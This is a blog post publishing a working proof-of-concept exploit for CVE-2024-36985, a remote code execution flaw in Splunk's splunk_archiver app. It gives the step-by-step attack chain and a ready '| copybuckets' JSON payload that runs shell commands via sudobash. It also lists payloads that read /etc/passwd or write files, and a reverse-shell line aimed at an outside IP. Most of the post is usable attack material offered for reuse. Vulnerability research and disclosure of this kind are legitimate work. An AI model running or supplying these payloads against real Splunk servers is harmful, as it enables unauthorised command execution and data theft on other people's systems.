---
layout: post
title:  "CVE-2024-36985 Splunk Remote Code Execution through lookup in splunk_archiver application, my PoC exploit"
datetime: 2024-09-14 00:50:00 MEST
last_modified_at: 2024-09-14 00:50:00 MEST
author: 'psytester'
---

This time I have analyzed the vulnerability of [CVE-2024-36985](https://www.cve.org/CVERecord?id=CVE-2024-36985) Remote Code Execution in Splunk splunk_archiver App.<br>
I checked the vulnerability how a (low-privileged) Splunk user can do this RCE and I'm happy to publish my working PoC exploit.<br>

`The “splunk_archiver“ application likely contains a script called “copybuckets.py“ that itself references a file called “erp_launcher.py“, which would likely execute a script called “sudobash“.`

The complete diff does not looks like the key, but at the end it was the simple fix to avoid the RCE
```
diff /opt/splunk-9.1.4/ /opt/splunk-9.1.5/

/opt/splunk-9.1.4/bin/jars/sudobash /opt/splunk-9.1.5/bin/jars/sudobash
172a173,175
> else
>     log "Providers other than SplunkMR not supported."
>     exit 1
```

# The goal
We need to call `sudobash` with our payload beacuse of its internal `/bin/bash <command>`. That's simple, because there is a advisory for it.<br>
Nice joke<br>

# The Problem
## 1. Problem
`copybuckets.py` is referenced here: [https://docs.splunk.com/Documentation/Splunk/9.1.4/Indexer/HowHadoopDataRollworks](https://docs.splunk.com/Documentation/Splunk/9.1.4/Indexer/HowHadoopDataRollworks)<br>
The page gives no detailed information about lookups `| archivebuckets` and `| copybuckets` :-(<br>
## 2. Problem
The user account needs at lease `splunk-system-role` rights, not only `user`
## 3. Problem
   In `/opt/splunk/etc/apps/splunk_archiver/bin/erp_launcher_duplicate.py` a variable is constructed
```
SUDO_BASH_COMMAND = os.path.join(os.environ['SPLUNK_HOME'], 'etc', 'apps', 'splunk_archiver', 'java-bin', 'jars', 'sudobash')
```
   `SUDO_BASH_COMMAND` pointing to `/opt/splunk/etc/apps/splunk_archiver/java-bin/jars/sudobash`<br>
   
   Ohh no, a fresh installed Splunk instance does not have this required `sudobash` bash file at its location :-(<br>
   There is a file located here only `/opt/splunk/bin/jars/sudobash`<br>
   Too bad?<br>
## 4. Problem
The `| copybuckets` lookup does nothing, but some error results of search can be found in `SID`related `search.log`
```
find /opt/splunk/var/run/splunk/dispatch/ -name "search.log" |xargs ls -ltr
less /opt/splunk/var/run/splunk/dispatch/1726261594.102/search.log

09-13-2024 23:06:34.254 ERROR ScriptRunner [138430 StreamScriptThreadfor/opt/splunk-9.1.4/etc/apps/splunk_archiver/bin/copybuckets.py] - stderr from '/opt/splunk-9.1.4/bin/python3.7 /opt/splunk-9.1.4/etc/apps/splunk_archiver/bin/copybuckets.py':      jsonStr = sys.argv[1:][0].split("=",1)[1]
09-13-2024 23:06:34.254 ERROR ScriptRunner [138430 StreamScriptThreadfor/opt/splunk-9.1.4/etc/apps/splunk_archiver/bin/copybuckets.py] - stderr from '/opt/splunk-9.1.4/bin/python3.7 /opt/splunk-9.1.4/etc/apps/splunk_archiver/bin/copybuckets.py':  IndexError: list index out of range
```
Ok, it needs some Json input. After debugging and playing a lot, it was clear what kind of Json is required.<br>
We need some special structure and values, required to pass the checks in `copybuckets.py` and `erp_launcher_duplicate.py` and to provide our payload.<br>

Ok, let's dig deeper. After playing around with both lookups, they work in this way.<br>

# The attack chain
## 1. We need the `sudobash` file
You may wait until this archivebuckets job was done somehow internally by a cron job, but I did not test this.<br>
We manually triggering the setup to have the file copied
```
| archivebuckets forcerun=1
```
Now we have `/opt/splunk-9.1.4/etc/apps/splunk_archiver/java-bin/jars/sudobash`<br>
That's it :-)<bR>

That's because archivebuckets.py calls `vixutils.copyJars()` in /opt/splunk/etc/apps/splunk_archiver/bin/vixutils_duplicate.py to copy files from `/opt/splunk/bin/jars/` into `appbinjars`
```
def _copyJars(splunkhome, appbinjars):
    splunkjars = os.path.join(splunkhome, 'bin', 'jars')
    dir_util.copy_tree(splunkjars, appbinjars, update=1, verbose=0)
    _trimDirToTemplate(splunkjars, appbinjars)
```

## 2. Calling `| copybuckets` with json data
We need to give at least one virtual index provider in `vixes`:
```
 \"vixes\":{
  \"vix1\": {\"provider\": \"psytester's PoC\"}
 },
```
We need to call `/opt/splunk/etc/apps/splunk_archiver/java-bin/jars/sudobash` in `providers` as `command`
And the path has to match `SUDO_BASH_COMMAND`!
```
  \"providers\": {
  \"providerparam\":{
   \"command.arg.1\":\"/opt/splunk/etc/apps/splunk_archiver/java-bin/jars/sudobash\",
   ....
```
and finally we need to pass our payload command `id` as additional `command` and optionally we can pass system environments by `env.`<br>
We combine both, but it's not required.
```
   \"command.arg.2\":\"-c $SOME_ENV\",
   \"env.SOME_ENV\":\"id\"
  }
 }
```
At the end we call `/opt/splunk/etc/apps/splunk_archiver/java-bin/jars/sudobash -c id`<br>
which will become internally `/bin/bash -c id`

# The PoC
## First, one step back!
The final payload structure
```
| copybuckets json="{
 \"vixes\":{
  \"vix1\": {\"provider\": \"psytester's PoC\"},
  \"vix2\": {\"provider\": \"another provider\"}
 },
  \"providers\": {
  \"providerparam\":{
   \"command.arg.1\":\"/opt/splunk/etc/apps/splunk_archiver/java-bin/jars/sudobash\",
   \"command.arg.2\":\"-c $SOME_ENV\",
   \"env.SOME_ENV\":\"id\"
  }
 }
}"
```
gives back in Events table an error in my case:
```
traceback"="Traceback (most recent call last):
  File \"/opt/splunk-9.1.4/lib/python3.7/site-packages/splunk/vix/erp_launcher.py\", line 426, in launchSplunkMRForIndexes
    _executeJavaProcesses(action, logFileName, indexFilterFunc, providers, vixes, indexes, serverId, serverName, sessionKey)
  File \"/opt/splunk-9.1.4/lib/python3.7/site-packages/splunk/vix/erp_launcher.py\", line 161, in _executeJavaProcesses
    if not c.startswith(command_prefixes) or not c.endswith('sudobash'):
TypeError: tuple for startswith must only contain str, not function
```
The error text helps us to solve the problem and question where splunk is installed.
Error message is pointing to `/opt/splunk-9.1.4/lib/python3.7/site-packages/splunk/vix/erp_launcher.py`,<br>
thus our final sudobash path will be `/opt/splunk-9.1.4/etc/apps/splunk_archiver/java-bin/jars/sudobash`

## Working PoC exploit payload
```
| copybuckets json="{
 \"vixes\":{
  \"vix1\": {\"provider\": \"psytester's PoC\"},
  \"vix2\": {\"provider\": \"another provider\"}
 },
  \"providers\": {
  \"providerparam\":{
   \"command.arg.1\":\"/opt/splunk-9.1.4/etc/apps/splunk_archiver/java-bin/jars/sudobash\",
   \"command.arg.2\":\"-c $SOME_ENV\",
   \"env.SOME_ENV\":\"id\"
  }
 }
}"
```

You can change the content of `env.SOME_ENV` to your needs, but shell calls with spaces do not work.<br>
[hacktricks bypass-forbidden-spaces](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) was my help<br>
Working payload are:
```
\"env.SOME_ENV\":\"id\"
\"env.SOME_ENV\":\"{touch,/tmp/exploited}\"
\"env.SOME_ENV\":\"{cat,/etc/passwd}\"
```
A reverse shell by `-l > /dev/tcp/192.168.4.107/4242 0<&1 2>&1` does not work, but there is another working case. Belive me :-)

Thank you for reading. The CVE is not my credit, but the work on the PoC exploit is powered by psytester, this post was only for my private fun. ;-)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2024 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
